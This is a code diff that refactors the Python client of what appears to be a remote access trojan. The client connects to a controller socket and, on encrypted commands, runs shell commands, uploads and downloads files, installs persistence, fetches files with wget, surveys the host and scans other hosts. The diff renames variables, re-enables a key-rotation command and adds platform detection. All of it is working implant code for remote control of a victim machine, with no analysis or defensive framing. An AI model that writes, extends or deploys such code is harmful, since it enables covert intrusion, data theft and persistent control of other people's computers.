@@ -19,19 +19,19 @@ from core import toolkit
 from core import common
 
 
-PLAT = sys.platform
 HOST = 'localhost'
 PORT = 1337
 
 
 def main():
-    s = socket.socket()
-    s.connect((HOST, PORT))
-    client = common.Client(s, HOST, 1)
+    conn = socket.socket()
+    conn.connect((HOST, PORT))
+    client = common.Client(conn, HOST, 1)
 
     while True:
-        results = ""
+        results = ''
         data = client.recvGCM()
+
         if not data:
             continue
 
@@ -40,7 +40,7 @@ def main():
 
         # stop client
         if cmd == 'kill':
-            s.close()
+            conn.close()
             sys.exit(0)
 
         # run command
@@ -56,7 +56,6 @@ def main():
                 fname = fname.strip()
                 if not os.path.isfile(fname):
                     continue
-
                 client.sendfile(fname)
                 continue
 
@@ -66,22 +65,40 @@ def main():
                 fname = fname.strip()
                 if os.path.isfile(fname):
                     continue
-
                 client.recvfile(fname)
                 continue
 
-        # # regenerate DH key
-        # elif cmd == 'rekey':
-        #     dh_key = crypto.diffiehellman(s)
+        # regenerate DH key
+        elif cmd == 'rekey':
+            client.dh_key = crypto.diffiehellman(client.conn)
 
-        elif cmd == 'persistence':  results = persistence.run(PLAT)
-        elif cmd == 'wget':         results = toolkit.wget(action)
-        elif cmd == 'unzip':        results = toolkit.unzip(action)
-        elif cmd == 'survey':       results = survey.run(PLAT)
-        elif cmd == 'scan':         results = scan.single_host(action)
+        elif cmd == 'persistence':
+            results = persistence.run(plat)
+
+        elif cmd == 'wget':
+            results = toolkit.wget(action)
+
+        elif cmd == 'unzip':
+            results = toolkit.unzip(action)
+
+        elif cmd == 'survey':
+            results = survey.run(plat)
+
+        elif cmd == 'scan':
+            results = scan.single_host(action)
 
         client.sendGCM(results)
 
 
 if __name__ == '__main__':
+    plat = sys.platform
+    if plat.startswith('win'):
+        plat = 'win'
+    elif plat.startswith('linux'):
+        plat = 'nix'
+    elif plat.startswith('darwin'):
+        plat = 'mac'
+    else:
+        plat = 'unk'
+
     main()
